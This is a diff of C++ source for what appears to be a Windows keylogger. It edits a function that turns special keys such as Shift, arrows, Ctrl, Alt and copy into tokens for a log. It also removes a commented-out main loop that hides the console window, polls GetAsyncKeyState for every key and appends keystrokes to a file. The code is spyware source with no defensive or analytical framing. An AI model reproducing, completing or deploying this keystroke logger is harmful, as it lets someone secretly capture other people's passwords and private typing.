@@ -35,87 +35,63 @@ bool SpecialKeys(int S_Key)
 		cout << "pressed ENTER";
 		TLOG("\n");
 		return true;
-	case '¾':
+	case '.':
 		cout << "pressed PERIOD";
 		TLOG(".");
 		return true;
+	case ',':
+		cout << "pressed COMMA";
+		TLOG(",");
+		return true;
+	case VK_OEM_COPY:
+		cout << "COPIED";
+		TLOG("COPY");
+		return true;
 	case VK_SHIFT:
 		cout << "pressed SHIFT";
-		TLOG("_SHIFT_");
+		TLOG("SHIFT");
 		return true;
 	case VK_BACK:
 		cout << "pressed BACKSPACE";
 		TLOG("\b");
 		return true;
 	case VK_RBUTTON:
-		cout << "_R_CLICK_";
-		TLOG("_R_CLICK_");
+		cout << "R_CLICK";
+		TLOG("R_CLICK");
 		return true;
 	case VK_CAPITAL:
-		cout << "_CAPS_LOCK_";
-		TLOG("_CAPS_LCOK");
+		cout << "CAPS_LOCK";
+		TLOG("CAPS_LOCK");
 		return true;
 	case VK_TAB:
-		cout << "_TAB";
-		TLOG("_TAB");
+		cout << "TAB";
+		TLOG("TAB");
 		return true;
 	case VK_UP:
-		cout << "_UP";
-		TLOG("_UP_ARROW_KEY");
+		cout << "UP";
+		TLOG("UP_ARROW_KEY");
 		return true;
 	case VK_DOWN:
-		cout << "_DOWN";
-		TLOG("_DOWN_ARROW_KEY");
+		cout << "DOWN";
+		TLOG("DOWN_ARROW_KEY");
 		return true;
 	case VK_LEFT:
-		cout << "_LEFT";
-		TLOG("_LEFT_ARROW_KEY");
+		cout << "LEFT";
+		TLOG("LEFT_ARROW_KEY");
 		return true;
 	case VK_RIGHT:
-		cout << "_RIGHT";
-		TLOG("_RIGHT_ARROW_KEY");
+		cout << "RIGHT";
+		TLOG("RIGHT_ARROW_KEY");
 		return true;
 	case VK_CONTROL:
-		cout << "_CONTROL";
-		TLOG("_CONTROL");
+		cout << "CONTROL";
+		TLOG("CONTROL");
 		return true;
 	case VK_MENU:
-		cout << "_ALT";
-		TLOG("_ALT");
+		cout << "ALT";
+		TLOG("ALT");
 		return true;
 	default:
 		return false;
 	}
 }
-
-
-
-//void main()
-//{
-//	//stringGetter();
-//	//ShowWindow(GetConsoleWindow(), SW_HIDE);
-//	char KEY = 'x';
-//
-//	while (true)
-//	{
-//		Sleep(10);
-//		for (int KEY = 8; KEY <= 190; KEY++)
-//		{
-//			if (GetAsyncKeyState(KEY) == -32767)
-//			{
-//				if (SpecialKeys(KEY) == false)
-//				{
-//					cout << "network called" << endl;
-//					fstream TLOGFile;
-//					TLOGFile.open("dat.txt", fstream::app);
-//					if (TLOGFile.is_open())
-//					{
-//						TLOGFile << char(KEY);
-//						TLOGFile.close();
-//					}
-//				}
-//			}
-//		}
-//	}
-//}
-
